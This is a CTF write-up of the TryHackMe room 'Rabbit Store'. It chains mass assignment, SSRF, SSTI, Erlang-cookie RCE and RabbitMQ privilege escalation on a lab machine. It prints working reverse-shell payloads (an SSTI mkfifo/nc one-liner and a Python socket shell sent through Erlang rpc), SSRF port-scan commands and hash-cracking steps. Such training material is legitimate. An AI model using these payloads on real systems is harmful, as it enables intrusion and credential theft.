---
date: 2025-02-25T21:16:11-06:00
# description: ""
image: "/images/THM-RabbitStore/RabbitStore.png"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: Rabbit Store"
type: "post"
---

* Platform: TryHackMe
* Link: [Rabbit Store](https://tryhackme.com/room/rabbitstore)
* Level: Medium
* OS: Linux
---

Rabbit Store presents a couple of uncommon services. The challenge begins with identifying a mass assignment vulnerability in an API, which is then leveraged alongside an SSRF vulnerability to retrieve the API documentation. One of the discovered endpoints is vulnerable to SSTI, allowing us to gain initial access to the target system. Through enumeration, we uncover an Erlang cookie, enabling us to pivot to another user. From there, we escalate our privileges by creating an admin user in RabbitMQ and exporting a file containing sensitive information, including the root user’s password hash. By properly formatting the hash, we ultimately retrieve the root password and achieve full system compromise.

## Scanning

```
nmap -T4 -sC -sV -Pn -p- -oA nmap/Rabbit_Store {TARGET_IP}
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 21:15 CST
Warning: 10.10.117.80 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.117.80
Host is up (0.19s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)

80/tcp    open     http         Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://cloudsite.thm/

3026/tcp  filtered agri-gateway

4369/tcp  open     epmd         Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
12606/tcp filtered unknown
14949/tcp filtered unknown
18309/tcp filtered unknown
25672/tcp open     unknown
25890/tcp filtered unknown
26284/tcp filtered unknown
35021/tcp filtered unknown
52841/tcp filtered unknown
59431/tcp filtered unknown
62532/tcp filtered unknown
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1250.63 seconds
```

We find four open ports with Nmap:
- 22 running SSH 
- 80 running http, with a redirection to `cloudsite.thm`
- 4369 running epmd
- 25672 (this is the Erlang Distribution port, used for RabbitMQ clustering)

> the `epmd` service (Erlang Port Mapper Daemon) is used by Erlang applications to discover each other on a network. 
> _Read more about the service [here](https://www.erlang.org/docs/26/man/epmd)._

## Enumeration

We use `nc -vz {TARGET_IP} 25672` to verify the status of `RabbitMQ`.

![RabbitMQ service test](/images/THM-RabbitStore/rabbitMQ_test.png)

The output strongly suggests that `RabbitMQ` is running on the target. 

> RabbitMQ is an open-source message broker that implements the Advanced Message Queuing Protocol (AMQP). It is used for asynchronous communication between applications, enabling them to send and receive messages without direct interaction.
> _Learn more about it [here](https://www.rabbitmq.com/)._

At `http://cloudsite.thm` we find a website for a company providing cloud services.

![clousite website](/images/THM-RabbitStore/website_RabbitStore.png)

When trying to create an account we get redirected to `http://storage.cloudsite.thm/register.html`, we need to update the `/etc/hosts` file in order to access it.

![clousite signup page](/images/THM-RabbitStore/signup_page.png)

We create an account and try logging in, but we receive a message telling us that our account need to be activated at `http://storage.cloudsite.thm/dashboard/inactive`. 

![account activation](/images/THM-RabbitStore/account_activation.png)

Noticing the `inactive` at the end of the url, we change it to active and get the message: `Your subscription is inactive. You cannot use our services.`. This seems to be an API endpoint.

![API inactive](/images/THM-RabbitStore/api_inactive_.png)

We login again and intercept the request this time. We see a POST request to `/api/login`. Its response contains a JWT (JSON Web Token), and we can see the `inactive` at the end (the current status of our account/subscription).

![POST request to /api/login](/images/THM-RabbitStore/JWT_login.png)

Let's try to find more API endpoints with ffuf.

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://storage.cloudsite.thm/api/FUZZ -ic -fc 404
```

We discover a few more but we cannot access the last two:
* `/register`
* `/docs`
* `/uploads`

![directory brute forcing on /api](/images/THM-RabbitStore/api_ffuf.png)

![access denied to /api/docs](/images/THM-RabbitStore/api_docs.png)

![access denied to /api/uploads](/images/THM-RabbitStore/api_uploads.png)

### Mass Assignment vulnerability

We use [jwt.io](https://jwt.io/) to analyze the token. We indeed see that our subscription is marked as `inactive` in the decoded payload.

![decoded JWT](/images/THM-RabbitStore/decoded_JWT.png)

We register an account and manually add `"subscription":"active"` to the POST request to `/api/register`.

![mass assignment vulnerability](/images/THM-RabbitStore/mass_assign.png)

Our request is successful!

![mass assignment vulnerability successful](/images/THM-RabbitStore/mass_assign1.png)

We login and now have access to `http://storage.cloudsite.thm/dashboard/active`, where we find a file upload feature.

> The vulnerability we exploited is known as a mass assignment vulnerability. It occurs when an API allows the modification of fields that should not be directly manipulated by users, such as sensitive or internal attributes. 

### Exploiting SSRF

We can upload a file from our computer or from an url.

![access to /dashboard/active](/images/THM-RabbitStore/dashboard_active.png)

![upload files from url option](/images/THM-RabbitStore/upload_url.png)

A feature accepting a user submitted URL can possibly mean an SSRF vulnerability so let's test that.

We create a test file and start a python server on our local machine.

```
echo 'let_me_in' > SSRF_test.txt

python3 -m http.server
```

![SSRF vulnerability test](/images/THM-RabbitStore/SSRF_vuln_test.png)

On the website we enter the url for our web server


```
http://{YOUR_IP}:{PORT}/{FILENAME}
```

![file submission via url](/images/THM-RabbitStore/url_sub.png)

It works, we receive a request on our web server and the file is successfully uploaded on the target.

![http 200 on web server](/images/THM-RabbitStore/ssrf_200.png)

![file successfully stored on the target](/images/THM-RabbitStore/upload.png)

After refreshing the page we can see it under `Uploaded Files`.

![uploaded file list](/images/THM-RabbitStore/uploaded_files.png)

When we click on the file link under `Uploaded Files`, there is a GET request sent to `/api/uploads/xxxxxxxxx`. This is used to download files.

![GET request to /api/uploads](/images/THM-RabbitStore/api_uploads_req.png)

Also we can now access `http://storage.cloudsite.thm/api/uploads`.

![successful access to /api/uploads](/images/THM-RabbitStore/api_uploads_access.png)

The URL upload function sends a request to `/api/store-url`.

![request to /api/store-url](/images/THM-RabbitStore/api_store_url.png)

We will try to access `/api/docs` via the SSRF.

![Attempt to access /api/docs via SSRF](/images/THM-RabbitStore/SSRF_api_docs_1.png)

The request is successful but the file downloaded only contains a `404` error.

![downloaded file contains 404 error](/images/THM-RabbitStore/404_file_dl.png)

#### SSRF Internal Port Scanning

Let's try to find some internal open ports on the target.

> The same method is used in [THM: Creative](https://scorpiosec.com/posts/thm-creative/#ssrf-internal-port-scanning).
> All these parameters are from the POST request to `/api/store-url`.

```
ffuf -u "http://storage.cloudsite.thm/api/store-url" \
-X POST \
-H "Content-Type: application/json" \
-H "Cookie: jwt=YOUR_JWT_VALUE" \
-d '{"url":"http://127.0.0.1:FUZZ"}' \
-w <(seq 1 65535) \
-mc all \
-t 100 \
-fs 41
```

We discover a few ports.

![Internal port scan via SSRF](/images/THM-RabbitStore/SSRF_internal_ports.png)

We will try to reach `/api/docs`.

```
http://127.0.0.1:3000/api/docs
```

![second attempt to access /api/docs](/images/THM-RabbitStore/api_docs_upload.png)

This time we get the correct file, detailing all the API endpoints. We already knew most of them, the new one is `/api/fetch_messeges_from_chatbot`.

![Successfully retrieve /api/docs](/images/THM-RabbitStore/api_docs_file.png)

### Exploiting SSTI 

The file tells us that we need to use a POST request to access it. So let's first capture the request to `http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot`.

As expected we get `GET method not allowed`.

![GET request to /api/fetch_messeges_from_chatbot](/images/THM-RabbitStore/GET_chatbot.png)

We change it to a POST request a send it again, now we have a 500 error.

![http 500 error to POST request](/images/THM-RabbitStore/internal_error_chatbot.png)

Since we are interacting with the API let's add `Content-Type: application/json` to our request and try to send some random parameters.

![username parameter required](/images/THM-RabbitStore/custom_req_chatbot.png)

It tells us that a username parameter is required. After adding it, we are told that the chatbot is under development. We notice that the answer includes the username we sent and any different name produces the same response.

There is probably some kind of template akin to this: `Sorry, $username, our chatbot server is currently under development.`

![successful POST request to /api/fetch_messeges_from_chatbot](/images/THM-RabbitStore/chatbot_response.png)

We will test for an SSTI (Server Side Template Injection) vulnerability. On [HackTricks](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#identify) we find plenty of payloads.

The payload is indeed executed!

![SSTI confirmed](/images/THM-RabbitStore/SSTI_confirmed.png)

## Initial Foothold (shell as azrael)

Although the payload works I am wondering why that is the case :thinking:.

Because this application uses the Express framework and `{{7*7}}` is a payload for `Jinja2 (Python)`.

![Rabbit Store tech stack](/images/THM-RabbitStore/rabbit_store_techstack.png)

We attempt to gain a reverse shell with the following payload:

```
{{ config.__class__.__init__.__globals__['os'].system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP PORT_NUMBER >/tmp/f') }}
```

![SSTI for RCE](/images/THM-RabbitStore/SSTI_RCE.png)

After sending the request we get a shell as `azrael` on our listener. We can also upgrade the shell with the commands below.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

![foothold and user flag](/images/THM-RabbitStore/user_flag.png)

### Shell as rabbitmq

Linpeas finds an Erlang file called `.erlang.cookie` in `/var/lib/rabbitmq/`. The file is owned by the `rabbitmq` user.

![Erlang file found](/images/THM-RabbitStore/erlang_file.png)

We recall from our nmap scan that we found ports `4369` and `25672` open.

On [this HackTricks page](https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection) we learn a few methods to achieve RCE using the Erlang cookie. However we need to slightly modify the command, instead of `couchdb@localhost` we use `rabbit@forge` (forge is the target hostname).

```
HOME=/ erl -sname kscorpio -setcookie CCOKIE_FOUND


rpc:call('rabbit@forge', os, cmd, ["python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\", PORT_NUMBER));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).
```

![Erlang Cookie RCE](/images/THM-RabbitStore/erl_rce.png)

On our listener we now have a shell as `rabbitmq`.

![rabbitmq shell](/images/THM-RabbitStore/rabbitmq_shell.png)

Now that we are `rabbitmq` we can use `rabbitmqctl`. We first try `list_users` but it returns an error.

```
rabbitmqctl list_users
```

![failed rabbitmq list_users command](/images/THM-RabbitStore/list_users.png)

We can correct the file permissions and run the command again.

```
chmod 400 /var/lib/rabbitmq/.erlang.cookie
```

![successful rabbitmq list_users command](/images/THM-RabbitStore/rabbitmq_list_users.png)

We get the message:

```
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.
```

## Privilege Escalation (shell as root)

We learn [here](https://www.rabbitmq.com/docs/definitions) that RabbitMQ stores information in `definitions`, these files can be exported as a JSON file. We can abuse our privileges to create a new user and do just that.

```
rabbitmqctl add_user kscorpio kscorpio 
rabbitmqctl set_permissions -p / kscorpio ".*" ".*" ".*"
rabbitmqctl set_user_tags kscorpio administrator
rabbitmqadmin export rabbit.definitions.json -u kscorpio -p kscorpio
```

![rabbitmq export definitions](/images/THM-RabbitStore/rabbitmq_privesc.png)

Inside the file we find the root password hash.

![root password hash in json file](/images/THM-RabbitStore/rabbitmq_pwd_hash.png)

To crack a RabbitMQ hash with a tool like hashcat we need to format it first. On [this Github issue page](https://github.com/QKaiser/cottontail/issues/27) we learn how to do it. 

```
echo "RABBITMQ_HASH" | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{8})(.*)/$2:$1/' > hash.txt


hashcat -m 1420 --hex-salt hash.txt /usr/share/wordlists/rockyou.txt
```

> For our case we do not need the second step.

The documentation [here](https://www.rabbitmq.com/docs/passwords#hash-via-http-api) let us know that the hashes use a `32 bit` (4 bytes) salt and we know that: "the password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password".

So the password is simply all the characters minus the salt (our formatted hash has already separated the two for us). We use it and are able to read the root flag.

![root password](/images/THM-RabbitStore/root_pwd.png)


![access to the root account](/images/THM-RabbitStore/root_flag.png)

## Additional Resources

This room is a great introduction to some novel exploitation (at least for me). Below are some additional resources to practice the featured vulnerabilities:

* Learn about mass assignment vulnerabilities with PortSwigger [here](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability).
* Learn about [SSRF](https://portswigger.net/web-security/ssrf) and [SSTI](https://portswigger.net/web-security/server-side-template-injection) from PortSwigger.
* Erlang Cookie RCE methods are available [here](https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection).


